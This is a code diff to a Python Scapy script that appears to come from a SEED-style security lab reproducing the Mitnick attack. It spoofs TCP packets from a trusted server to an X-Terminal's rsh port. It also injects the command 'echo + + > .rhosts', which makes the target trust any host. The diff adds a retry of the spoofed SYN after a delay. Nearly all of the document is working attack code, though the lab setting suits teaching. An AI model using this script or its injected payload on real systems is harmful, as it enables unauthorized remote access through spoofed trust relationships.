@@ -1,12 +1,8 @@
 from scapy.all import *
 import sys
+import time
 
-##
-
-interface = sys.argv[1]
-
-## 
-
+interface = sys.argv[1] # Network interface
 x_ip = "10.9.0.5" # X-Terminal
 x_port = 514 # Port number used by X-Terminal
 srv_ip = "10.9.0.6" # The trusted server
@@ -51,6 +47,7 @@ def spoof(pkt):
         print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))
 
         tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="PA", seq=1, ack=rec_seq+1)
+        # Puts + + string in .rhosts
         data = "1023\x00seed\x00seed\x00echo + + > .rhosts\x00"
         send(ip/tcp/data, verbose=0)
         print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))
@@ -63,6 +60,10 @@ def spoof(pkt):
 
 # Opens TCP connection with X-Terminal
 tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=0)
+send(ip/tcp)
+
+# Trusted Server will be able to send reset, wait some time and send SYN again
+time.sleep(4)
 send(ip/tcp)
 
 # Sniffs packets received
